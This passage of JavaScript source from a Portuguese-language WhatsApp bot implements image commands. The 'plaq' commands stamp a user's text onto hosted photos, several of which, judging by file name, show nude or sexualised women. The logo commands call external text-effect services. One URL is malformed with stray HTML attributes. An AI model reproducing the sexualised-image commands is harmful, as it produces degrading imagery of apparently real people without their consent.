if (args.length < 1) return reply(`${prefix}plaq4 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=${teks}&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter`) //api
plaq = ` *Plaquinha feita ✓* `
nezuko.sendMessage(sender, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: dnselo})
break

case 'plaq5'://by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(`${prefix}plaq5 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://umethroo.sirv.com/peito1.jpg?text.0.text=${teks}&text.0.position.x=-4%25&text.0.position.y=-6%25&text.0.size=14&text.0.color=000000&text.0.font.family=Shadows%20Into%20Light&text.0.font.weight=700`)
nezuko.sendMessage(sender, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: dnselo})
break

case 'plaq6':
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(`${prefix}plaq6 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
reply(mess.wait)
buffer = await getBuffer(`https://clutamac.sirv.com/1011b781-bab1-49e3-89db-ee2c064868fa%20(1).jpg?text.0.text=${teks}&text.0.position.gravity=northwest&text.0.position.x=22%25&text.0.position.y=60%25&text.0.size=12&text.0.color=000000&text.0.opacity=47&text.0.font.family=Roboto%20Mono&text.0.font.style=italic`)
await nezuko.sendMessage(sender, {image: buffer}, {quoted: dnselo})
break

case 'plaq7'://by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
teks1 = body.slice(5) 
if (teks1.length < 1) return reply('Use no mínimo 1 Letras!')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply(mess.wait)
buffer = await getBuffer(`https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=${teks}&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter`) 
plaq = ` *Plaquinha feita ✓* `
await nezuko.sendMessage(sender, {
    image: buffer,
    txt: plaq,
    quoted: dnselo
})
break

case 'plaq8': //by Nezuko-MD
reply(`<❗> Enviando no seu pv, aguarde.`)
teks1 = body.slice(5) 
if (teks1.length < 1) return reply('Use no mínimo 1 Letras!')
blk = body.slice(6)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
reply(mess.wait)
  buffer = await getBuffer(`https://blackzin.sirv.com/Plaq18/20220212_213215.jpg?text.0.text=${blk}&text.0.position.gravity=northwest&text.0.position.x=43%25&text.0.position.y=18%25&text.0.size=15&text.0.color=000000&text.0.opacity=57&text.0.font.family=Vollkorn&text.0.font.weight=800&text.0.font.style=italic&text.0.background.color=000000&text.0.outline.blur=32&text.0.outline.opacity=46&text.1.text=Daniel Domina bb%3F&text.1.position.gravity=center&text.1.position.x=10%25&text.1.position.y=30%25&text.1.size=20&text.1.color=000000&text.1.opacity=59&text.1.font.family=Playball&text.1.font.weight=700&text.1.outline.opacity=0" width="718" height="1009" alt="" />`)
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: dnselo
})
break
case 'plaq9'://by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(mess.blank)
teks = body.slice(6)
if (teks.length > 25) return reply('O texto é longo, até 25 caracteres')
reply(mess.wait)
buffer = await getBuffer(`https://ubbornag.sirv.com/Screenshot_20210513-151821.png?text.0.text=${teks}&text.0.position.x=-40%25&text.0.position.y=-65%25&text.0.size=30&text.0.color=000000&text.0.opacity=53&text.0.font.family=Shadows%20Into%20Light%20Two&text.0.outline.blur=15`)
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: dnselo
})
break

case 'plaq10'://by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(mess.blank)
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply(mess.wait)
buffer = await getBuffer(`https://rsymenti.sirv.com/images%20(10).jpeg?text.0.text=${teks}&text.0.position.gravity=south&text.0.position.x=4%25&text.0.position.y=-32%25&text.0.align=left&text.0.size=34&text.0.color=000000&text.0.opacity=78&text.0.background.opacity=78&text.0.outline.blur=72&text.0.outline.opacity=74`)
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: dnselo
})
break

case 'plaq11'://by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(mess.blank)
teks = body.slice(7)
if (teks.length > 20) return reply('O TEXTO E MUITO GRANDE NO MAXIMO 20 LETRAS')
reply(mess.wait)
buffer = await getBuffer(`https://lculitas.sirv.com/ETw3FRnXgAI3Up_.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.align=left&text.0.size=46&text.0.color=221b1b&text.0.opacity=47&text.0.font.family=Architects%20Daughter&text.0.background.color=783852&text.0.background.opacity=5&text.0.outline.blur=58`)
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: dnselo
})
break

case 'plaq4off': //by Nezuko-MD 
reply(`<❗> Enviando no seu pv, aguarde.`)
if (args.length < 1) return reply(`${prefix}plaq4 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(2).jpeg?profile=Zanga%204.0&text.0.text=${teks}`)
nezuko.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: dnselo})
break

//=============================\\

// LOGOS 

case 'shadow':
case 'angelwing':
case 'efeitoneon':
case 'cemiterio':
case 'metalgold':
case 'narutologo':
case 'fire':
case 'smoke':  
case 'papel':
case 'lovemsg':
case 'lovemsg2':
case 'lovemsg3':
case 'coffecup':
case 'coffecup2':  
case 'cup':
case 'florwooden':
case 'madeira':
case 'neon2':
case 'lobometal':
case 'harryp':
case 'txtborboleta':
case 'blackpink':
case 'girlmascote': 
case 'logogame':
case 'equipemascote':
case 'fpsmascote':
case 'hackneon':
case 'ffavatar':
case 'mascotegame':
case 'wingeffect':
case 'angelglx':
case 'gizquadro':
case 'txtquadrinhos':
try {
textin = args.join(" ")
if(!textin) return reply("Cade o texto?")
reply(enviar.espere)
bla = await fetchJson(`https://nezsab-apis.xyz/api/${command}?texto=${textin}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
nezuko.sendMessage(from, {image: blabla}, {quoted: dnselo}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break  

case 'gameplay':
case 'ffbanner':
case 'mascoteavatar':  
try {
textin = args.join(" ")
txt1 = textin.split("/")[0];
txt2 = textin.split("/")[1];
if(!textin) return reply("Cade o texto?")
if(!textin.includes("/")) return reply(`Cade a / precisa dela para a separação..\nExemplo: ${prefix + command} Game/Play`)
reply(enviar.espere)
bla = await fetchJson(`https://nezsab-apis.xyz/api/${command}?texto=${txt1}&texto2=${txt2}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
nezuko.sendMessage(from, {image: blabla}, {quoted: dnselo}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'googlesg':
try {
textin = args.join(" ")
txt1 = textin.split("/")[0];
txt2 = textin.split("/")[1];
txt3 = textin.split("/")[2];
if(!textin) return reply("Cade o texto?")
if(!textin.includes("/")) return reply(`Cade a / precisa dela para a separação..\nExemplo: ${prefix + command} Game/Play/Sad`)
reply(enviar.espere)
bla = await fetchJson(`https://nezsab-apis.xyz/api/${command}?texto=${txt1}&texto2=${txt2}&texto3=${txt3}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
nezuko.sendMessage(from, {image: blabla}, {quoted: dnselo}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break  

// LOGOS 

case 'metalfire':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/hot-metal-text-effect-843.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 𝐍𝐞𝐳𝐮𝐤𝐨 - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'thunder':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere) 
thiccysapi.textpro("https://textpro.me/create-thunder-text-effect-online-881.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neongreen':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/green-neon-text-effect-874.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neontxt':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/free-advanced-glow-text-effect-873.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'rainbow':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'ice':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/ice-cold-text-effect-862.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'summer3d':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-summer-text-effect-with-a-palm-tree-1083.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'blackp1':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'blackp2':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-blackpink-logo-decorated-with-roses-online-free-1080.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'summerlg':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'bussineslg':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-business-sign-text-effect-1078.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'typography':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-artistic-typography-online-1086.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'gradient':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-gradient-neon-light-text-effect-online-1085.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'lapis':
case 'lápis':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case '3dstone':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'fiction':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-science-fiction-text-effect-online-free-1038.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'anotar':
if (!q) return enviar(`Exemplo: ${prefix + command} Nota 1- Sexo ofc`)
const ntt = args.join(' ')
const sexo = {sender, Nota: ntt}
notas.push(sexo) 
fs.writeFileSync('./lib/notas.json', JSON.stringify(notas))
reply (`${ntt} ADICIONADA A LISTA DE NOTAS`)
break

case 'totalnotas':

 minhapika= `
Total De Notas: ${notas.length}
`
for (let max of notas){
minhapika += `
${max.Nota}
`
}
reply(minhapika)
break

case 'wall':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/break-wall-text-effect-871.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'blood':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/blood-text-on-the-frosted-glass-941.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'joker':
case 'jokerlogo':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-logo-joker-online-934.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'demon':
case 'demongreen':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-green-horror-style-text-effect-online-1036.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'natal':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-christmas-holiday-snow-text-effect-1007.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'asfalto':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/road-warning-text-effect-878.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, di, image, {quoted: info})
console.log(data)
 } catch(err) { 
console.log(err)
} 
});
break

case 'neon3d':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neon':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'ossos':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/skeleton-text-effect-online-929.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'jeans':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/denim-text-effect-online-919.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'metalblue':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/glossy-blue-metal-text-effect-967.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'carbon':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/glossy-carbon-text-effect-965.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'pink':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/holographic-3d-text-effect-975.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'style':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/1917-style-text-effect-online-980.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'vidro':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/dropwater-text-effect-872.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'areia':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/write-in-sand-summer-beach-free-online-991.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neve':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/xmas-cards-3d-online-942.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neon3':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'nuvem':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'horror':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/horror-blood-text-effect-online-883.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'matrix':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/matrix-style-text-effect-online-884.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

